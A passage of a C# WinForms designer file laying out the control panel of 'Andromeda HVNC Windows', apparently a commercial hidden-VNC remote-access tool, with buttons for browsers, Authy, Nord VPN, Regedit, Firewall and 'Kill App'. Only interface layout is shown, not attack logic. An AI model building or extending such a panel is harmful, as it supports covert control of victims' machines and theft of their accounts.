            this.Guna2HtmlLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.Guna2HtmlLabel1.Location = new System.Drawing.Point(639, 10);
            this.Guna2HtmlLabel1.Name = "Guna2HtmlLabel1";
            this.Guna2HtmlLabel1.Size = new System.Drawing.Size(209, 23);
            this.Guna2HtmlLabel1.TabIndex = 119;
            this.Guna2HtmlLabel1.Text = "Andromeda HVNC Windows";
            // 
            // Guna2CirclePictureBox1
            // 
            this.Guna2CirclePictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Guna2CirclePictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CirclePictureBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(122)))), ((int)(((byte)(109)))));
            this.Guna2CirclePictureBox1.ImageRotate = 0F;
            this.Guna2CirclePictureBox1.Location = new System.Drawing.Point(1446, 11);
            this.Guna2CirclePictureBox1.Name = "Guna2CirclePictureBox1";
            this.Guna2CirclePictureBox1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CirclePictureBox1.Size = new System.Drawing.Size(18, 18);
            this.Guna2CirclePictureBox1.TabIndex = 0;
            this.Guna2CirclePictureBox1.TabStop = false;
            this.Guna2CirclePictureBox1.Click += new System.EventHandler(this.Guna2CirclePictureBox1_Click);
            // 
            // guna2PictureBox22
            // 
            this.guna2PictureBox22.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox22.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox22.Image")));
            this.guna2PictureBox22.ImageRotate = 0F;
            this.guna2PictureBox22.Location = new System.Drawing.Point(22, 666);
            this.guna2PictureBox22.Name = "guna2PictureBox22";
            this.guna2PictureBox22.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox22.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox22.TabIndex = 166;
            this.guna2PictureBox22.TabStop = false;
            this.guna2PictureBox22.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel42
            // 
            this.guna2HtmlLabel42.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel42.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel42.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel42.Location = new System.Drawing.Point(57, 672);
            this.guna2HtmlLabel42.Name = "guna2HtmlLabel42";
            this.guna2HtmlLabel42.Size = new System.Drawing.Size(167, 15);
            this.guna2HtmlLabel42.TabIndex = 159;
            this.guna2HtmlLabel42.Text = "https://andromedasoftware.com.br";
            // 
            // guna2PictureBox19
            // 
            this.guna2PictureBox19.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox19.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox19.Image")));
            this.guna2PictureBox19.ImageRotate = 0F;
            this.guna2PictureBox19.Location = new System.Drawing.Point(259, 666);
            this.guna2PictureBox19.Name = "guna2PictureBox19";
            this.guna2PictureBox19.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox19.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox19.TabIndex = 165;
            this.guna2PictureBox19.TabStop = false;
            this.guna2PictureBox19.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel43
            // 
            this.guna2HtmlLabel43.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel43, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel43.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel43.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel43.Location = new System.Drawing.Point(290, 672);
            this.guna2HtmlLabel43.Name = "guna2HtmlLabel43";
            this.guna2HtmlLabel43.Size = new System.Drawing.Size(193, 15);
            this.guna2HtmlLabel43.TabIndex = 164;
            this.guna2HtmlLabel43.Text = "https://t.me/Andromeda_Software_LTD";
            // 
            // Painel
            // 
            this.Painel.AutoScroll = true;
            this.Painel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel.BorderRadius = 10;
            this.Painel.BorderThickness = 1;
            this.Painel.Controls.Add(this.Icon_Application);
            this.Painel.Controls.Add(this.Icon_Home);
            this.Painel.Controls.Add(this.guna2Panel1);
            this.Painel.Controls.Add(this.guna2PictureBox1);
            this.guna2Transition1.SetDecoration(this.Painel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Painel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel.Location = new System.Drawing.Point(0, 47);
            this.Painel.Name = "Painel";
            this.Painel.Size = new System.Drawing.Size(1486, 788);
            this.Painel.TabIndex = 127;
            // 
            // Icon_Application
            // 
            this.Icon_Application.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Icon_Application, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Icon_Application.Image = ((System.Drawing.Image)(resources.GetObject("Icon_Application.Image")));
            this.Icon_Application.ImageRotate = 0F;
            this.Icon_Application.Location = new System.Drawing.Point(731, 751);
            this.Icon_Application.Name = "Icon_Application";
            this.Icon_Application.Size = new System.Drawing.Size(25, 25);
            this.Icon_Application.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Icon_Application.TabIndex = 245;
            this.Icon_Application.TabStop = false;
            this.Icon_Application.UseTransparentBackground = true;
            this.Icon_Application.Visible = false;
            this.Icon_Application.Click += new System.EventHandler(this.guna2PictureBox46_Click);
            // 
            // Icon_Home
            // 
            this.Icon_Home.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Icon_Home, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Icon_Home.Image = ((System.Drawing.Image)(resources.GetObject("Icon_Home.Image")));
            this.Icon_Home.ImageRotate = 0F;
            this.Icon_Home.Location = new System.Drawing.Point(731, 751);
            this.Icon_Home.Name = "Icon_Home";
            this.Icon_Home.Size = new System.Drawing.Size(25, 25);
            this.Icon_Home.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Icon_Home.TabIndex = 243;
            this.Icon_Home.TabStop = false;
            this.Icon_Home.UseTransparentBackground = true;
            this.Icon_Home.Click += new System.EventHandler(this.guna2PictureBox39_Click_1);
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.Controls.Add(this.Painel_1);
            this.guna2Panel1.Controls.Add(this.VNCBox);
            this.guna2Transition1.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel1.Location = new System.Drawing.Point(37, 41);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(1398, 704);
            this.guna2Panel1.TabIndex = 1;
            // 
            // Painel_1
            // 
            this.Painel_1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_1.Controls.Add(this.guna2PictureBox23);
            this.Painel_1.Controls.Add(this.guna2PictureBox44);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel30);
            this.Painel_1.Controls.Add(this.guna2PictureBox37);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel23);
            this.Painel_1.Controls.Add(this.guna2PictureBox41);
            this.Painel_1.Controls.Add(this.guna2PictureBox19);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel43);
            this.Painel_1.Controls.Add(this.guna2PictureBox22);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel42);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel27);
            this.Painel_1.Controls.Add(this.guna2PictureBox36);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel22);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel24);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel36);
            this.Painel_1.Controls.Add(this.guna2PictureBox29);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel20);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel25);
            this.Painel_1.Controls.Add(this.guna2PictureBox45);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel31);
            this.Painel_1.Controls.Add(this.guna2PictureBox24);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel17);
            this.Painel_1.Controls.Add(this.guna2PictureBox12);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel11);
            this.Painel_1.Controls.Add(this.guna2PictureBox30);
            this.Painel_1.Controls.Add(this.guna2PictureBox42);
            this.Painel_1.Controls.Add(this.guna2PictureBox28);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel16);
            this.Painel_1.Controls.Add(this.guna2PictureBox27);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel15);
            this.Painel_1.Controls.Add(this.guna2PictureBox21);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel14);
            this.Painel_1.Controls.Add(this.guna2PictureBox18);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel13);
            this.Painel_1.Controls.Add(this.guna2PictureBox17);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel28);
            this.Painel_1.Controls.Add(this.guna2PictureBox13);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel12);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel26);
            this.Painel_1.Controls.Add(this.guna2PictureBox20);
            this.Painel_1.Controls.Add(this.guna2PictureBox31);
            this.Painel_1.Controls.Add(this.guna2PictureBox8);
            this.Painel_1.Controls.Add(this.guna2PictureBox38);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel7);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel40);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel35);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel39);
            this.Painel_1.Controls.Add(this.guna2PictureBox35);
            this.Painel_1.Controls.Add(this.guna2PictureBox16);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel41);
            this.Painel_1.Controls.Add(this.guna2PictureBox9);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel34);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel8);
            this.Painel_1.Controls.Add(this.guna2PictureBox43);
            this.Painel_1.Controls.Add(this.guna2PictureBox34);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel29);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel33);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel18);
            this.Painel_1.Controls.Add(this.guna2PictureBox10);
            this.Painel_1.Controls.Add(this.guna2PictureBox33);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel9);
            this.Painel_1.Controls.Add(this.guna2PictureBox11);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel32);
            this.Painel_1.Controls.Add(this.guna2PictureBox15);
            this.Painel_1.Controls.Add(this.guna2PictureBox25);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel38);
            this.Painel_1.Controls.Add(this.guna2PictureBox32);
            this.Painel_1.Controls.Add(this.guna2PictureBox14);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel10);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel37);
            this.Painel_1.Controls.Add(this.guna2PictureBox2);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel19);
            this.Painel_1.Controls.Add(this.guna2PictureBox26);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel6);
            this.Painel_1.Controls.Add(this.Guna2PictureBox80);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel4);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel2);
            this.Painel_1.Controls.Add(this.guna2PictureBox7);
            this.Painel_1.Controls.Add(this.guna2PictureBox3);
            this.Painel_1.Controls.Add(this.guna2PictureBox4);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel3);
            this.Painel_1.Controls.Add(this.guna2PictureBox6);
            this.Painel_1.Controls.Add(this.guna2HtmlLabel5);
            this.guna2Transition1.SetDecoration(this.Painel_1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_1.Location = new System.Drawing.Point(0, 0);
            this.Painel_1.Name = "Painel_1";
            this.Painel_1.ShadowDecoration.Color = System.Drawing.Color.Blue;
            this.Painel_1.ShadowDecoration.Enabled = true;
            this.Painel_1.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(10);
            this.Painel_1.Size = new System.Drawing.Size(592, 704);
            this.Painel_1.TabIndex = 128;
            this.Painel_1.Visible = false;
            this.Painel_1.Paint += new System.Windows.Forms.PaintEventHandler(this.guna2Panel2_Paint);
            // 
            // guna2PictureBox44
            // 
            this.guna2PictureBox44.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox44, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox44.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox44.Image")));
            this.guna2PictureBox44.ImageRotate = 0F;
            this.guna2PictureBox44.Location = new System.Drawing.Point(265, 575);
            this.guna2PictureBox44.Name = "guna2PictureBox44";
            this.guna2PictureBox44.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox44.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox44.TabIndex = 197;
            this.guna2PictureBox44.TabStop = false;
            this.guna2PictureBox44.UseTransparentBackground = true;
            this.guna2PictureBox44.Click += new System.EventHandler(this.guna2PictureBox44_Click);
            // 
            // guna2HtmlLabel30
            // 
            this.guna2HtmlLabel30.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel30, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel30.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel30.Location = new System.Drawing.Point(257, 616);
            this.guna2HtmlLabel30.Name = "guna2HtmlLabel30";
            this.guna2HtmlLabel30.Size = new System.Drawing.Size(48, 15);
            this.guna2HtmlLabel30.TabIndex = 201;
            this.guna2HtmlLabel30.Text = "Notepad";
            // 
            // guna2PictureBox37
            // 
            this.guna2PictureBox37.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox37, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox37.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox37.Image")));
            this.guna2PictureBox37.ImageRotate = 0F;
            this.guna2PictureBox37.Location = new System.Drawing.Point(531, 165);
            this.guna2PictureBox37.Name = "guna2PictureBox37";
            this.guna2PictureBox37.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox37.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox37.TabIndex = 205;
            this.guna2PictureBox37.TabStop = false;
            this.guna2PictureBox37.UseTransparentBackground = true;
            this.guna2PictureBox37.Click += new System.EventHandler(this.guna2PictureBox37_Click);
            // 
            // guna2HtmlLabel23
            // 
            this.guna2HtmlLabel23.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel23.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel23.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel23.Location = new System.Drawing.Point(529, 206);
            this.guna2HtmlLabel23.Name = "guna2HtmlLabel23";
            this.guna2HtmlLabel23.Size = new System.Drawing.Size(43, 15);
            this.guna2HtmlLabel23.TabIndex = 210;
            this.guna2HtmlLabel23.Text = "Kill App";
            // 
            // guna2PictureBox41
            // 
            this.guna2PictureBox41.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox41.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox41.Image")));
            this.guna2PictureBox41.ImageRotate = 0F;
            this.guna2PictureBox41.Location = new System.Drawing.Point(173, 575);
            this.guna2PictureBox41.Name = "guna2PictureBox41";
            this.guna2PictureBox41.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox41.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox41.TabIndex = 194;
            this.guna2PictureBox41.TabStop = false;
            this.guna2PictureBox41.UseTransparentBackground = true;
            this.guna2PictureBox41.Click += new System.EventHandler(this.guna2PictureBox41_Click);
            // 
            // guna2HtmlLabel27
            // 
            this.guna2HtmlLabel27.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel27.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel27.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel27.Location = new System.Drawing.Point(169, 616);
            this.guna2HtmlLabel27.Name = "guna2HtmlLabel27";
            this.guna2HtmlLabel27.Size = new System.Drawing.Size(43, 15);
            this.guna2HtmlLabel27.TabIndex = 199;
            this.guna2HtmlLabel27.Text = "Regedit";
            // 
            // guna2PictureBox36
            // 
            this.guna2PictureBox36.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox36.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox36.Image")));
            this.guna2PictureBox36.ImageRotate = 0F;
            this.guna2PictureBox36.Location = new System.Drawing.Point(531, 73);
            this.guna2PictureBox36.Name = "guna2PictureBox36";
            this.guna2PictureBox36.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox36.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox36.TabIndex = 204;
            this.guna2PictureBox36.TabStop = false;
            this.guna2PictureBox36.UseTransparentBackground = true;
            this.guna2PictureBox36.Click += new System.EventHandler(this.guna2PictureBox36_Click);
            // 
            // guna2HtmlLabel22
            // 
            this.guna2HtmlLabel22.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel22.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel22.Location = new System.Drawing.Point(531, 114);
            this.guna2HtmlLabel22.Name = "guna2HtmlLabel22";
            this.guna2HtmlLabel22.Size = new System.Drawing.Size(38, 15);
            this.guna2HtmlLabel22.TabIndex = 209;
            this.guna2HtmlLabel22.Text = "Hacker";
            // 
            // guna2HtmlLabel24
            // 
            this.guna2HtmlLabel24.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel24.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel24.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel24.Location = new System.Drawing.Point(259, 502);
            this.guna2HtmlLabel24.Name = "guna2HtmlLabel24";
            this.guna2HtmlLabel24.Size = new System.Drawing.Size(48, 15);
            this.guna2HtmlLabel24.TabIndex = 237;
            this.guna2HtmlLabel24.Text = "Comodo";
            // 
            // guna2HtmlLabel36
            // 
            this.guna2HtmlLabel36.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel36.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel36.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel36.Location = new System.Drawing.Point(346, 204);
            this.guna2HtmlLabel36.Name = "guna2HtmlLabel36";
            this.guna2HtmlLabel36.Size = new System.Drawing.Size(53, 15);
            this.guna2HtmlLabel36.TabIndex = 241;
            this.guna2HtmlLabel36.Text = "Nord VPN";
            // 
            // guna2PictureBox29
            // 
            this.guna2PictureBox29.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox29.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox29.Image")));
            this.guna2PictureBox29.ImageRotate = 0F;
            this.guna2PictureBox29.Location = new System.Drawing.Point(265, 461);
            this.guna2PictureBox29.Name = "guna2PictureBox29";
            this.guna2PictureBox29.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox29.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox29.TabIndex = 234;
            this.guna2PictureBox29.TabStop = false;
            this.guna2PictureBox29.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel20
            // 
            this.guna2HtmlLabel20.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel20.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.guna2HtmlLabel20.Location = new System.Drawing.Point(22, 16);
            this.guna2HtmlLabel20.Name = "guna2HtmlLabel20";
            this.guna2HtmlLabel20.Size = new System.Drawing.Size(149, 19);
            this.guna2HtmlLabel20.TabIndex = 231;
            this.guna2HtmlLabel20.Text = "Browsers & Applications";
            // 
            // guna2HtmlLabel25
            // 
            this.guna2HtmlLabel25.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel25.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel25.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel25.Location = new System.Drawing.Point(90, 502);
            this.guna2HtmlLabel25.Name = "guna2HtmlLabel25";
            this.guna2HtmlLabel25.Size = new System.Drawing.Size(48, 15);
            this.guna2HtmlLabel25.TabIndex = 236;
            this.guna2HtmlLabel25.Text = "Maxthon";
            // 
            // guna2PictureBox45
            // 
            this.guna2PictureBox45.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox45, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox45.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox45.Image")));
            this.guna2PictureBox45.ImageRotate = 0F;
            this.guna2PictureBox45.Location = new System.Drawing.Point(94, 352);
            this.guna2PictureBox45.Name = "guna2PictureBox45";
            this.guna2PictureBox45.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox45.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox45.TabIndex = 198;
            this.guna2PictureBox45.TabStop = false;
            this.guna2PictureBox45.UseTransparentBackground = true;
            this.guna2PictureBox45.Click += new System.EventHandler(this.guna2PictureBox45_Click);
            // 
            // guna2HtmlLabel31
            // 
            this.guna2HtmlLabel31.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel31, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel31.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel31.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel31.Location = new System.Drawing.Point(93, 393);
            this.guna2HtmlLabel31.Name = "guna2HtmlLabel31";
            this.guna2HtmlLabel31.Size = new System.Drawing.Size(42, 15);
            this.guna2HtmlLabel31.TabIndex = 202;
            this.guna2HtmlLabel31.Text = "Firewall";
            // 
            // guna2PictureBox24
            // 
            this.guna2PictureBox24.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox24.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox24.Image")));
            this.guna2PictureBox24.ImageRotate = 0F;
            this.guna2PictureBox24.Location = new System.Drawing.Point(17, 461);
            this.guna2PictureBox24.Name = "guna2PictureBox24";
            this.guna2PictureBox24.Size = new System.Drawing.Size(40, 40);
            this.guna2PictureBox24.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox24.TabIndex = 225;
            this.guna2PictureBox24.TabStop = false;
            this.guna2PictureBox24.UseTransparentBackground = true;
            this.guna2PictureBox24.Click += new System.EventHandler(this.guna2PictureBox24_Click);
            // 
            // guna2HtmlLabel17
            // 
            this.guna2HtmlLabel17.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel17.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel17.Location = new System.Drawing.Point(22, 507);
            this.guna2HtmlLabel17.Name = "guna2HtmlLabel17";
            this.guna2HtmlLabel17.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel17.TabIndex = 226;
            this.guna2HtmlLabel17.Text = "Authy";
            // 
            // guna2PictureBox12
            // 
            this.guna2PictureBox12.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox12.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox12.Image")));
            this.guna2PictureBox12.ImageRotate = 0F;
            this.guna2PictureBox12.Location = new System.Drawing.Point(173, 352);
            this.guna2PictureBox12.Name = "guna2PictureBox12";
            this.guna2PictureBox12.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox12.TabIndex = 188;
            this.guna2PictureBox12.TabStop = false;
            this.guna2PictureBox12.UseTransparentBackground = true;
            this.guna2PictureBox12.Click += new System.EventHandler(this.guna2PictureBox12_Click);
            // 
            // guna2HtmlLabel11
            // 
